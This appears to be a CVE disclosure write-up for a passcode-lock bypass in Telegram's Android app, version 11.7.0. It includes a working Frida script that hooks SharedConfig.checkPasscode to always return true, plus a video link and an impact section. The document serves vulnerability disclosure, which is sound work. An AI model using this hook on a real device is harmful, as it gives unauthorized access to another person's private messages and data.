# CVE-2024-54916
An issue in the SharedConfig class of Telegram android apk v.11.7.0 allows a physically proximate attacker to escalate privileges via manipulating the return value of the checkPasscode method.
# Vulnerability Type
Incorrect Access Control
# Vendor of Product
Telegram
# Affected Product Code Base
Telegram android apk v.11.7.0
# Affected Component
org.telegram.messenger.SharedConfig
# Exploitation
  
#### Identify the Target Class and Method:
- The SharedConfig class in the application manages the logic for passcode verification.
- The checkPasscode method within this class is responsible for determining the validity of the entered passcode.

#### Hook the method using frida
-  A Frida script is used to hook into the checkPasscode method in the SharedConfig class. The method's implementation is altered to always return true, bypassing the actual passcode validation.

#### Execution
- The Frida script is executed while the app is running(Dynamically). Any passcode input by the user will be accepted as valid, allowing unauthorized access.

# POC

Java.perform(function() {
 // Locate the SharedConfig class in the target application
 var PassCodeActivity = Java.use('org.telegram.messenger.SharedConfig');

 // Hook the checkPasscode method to modify its behavior
 PassCodeActivity.checkPasscode.implementation = function(passcode) {

  // Bypass the actual passcode check by always returning true
  return true;

 };

 });
 
 ### Video POC Link:- 
 https://drive.google.com/file/d/1-lW1IQiCyj-8UXZOTedYPGPhQwfMLX4M/view?usp=sharing
 
 # Impact:-
 This vulnerability is a client-side security bypass vulnerability. It affects users of the application who rely on the passcode feature to protect sensitive data or restrict access to certain app functionalities. By exploiting this vulnerability, an attacker can bypass the passcode check and gain unauthorized access to areas of the app that should be protected, potentially exposing user data or allowing unauthorized actions within the app.

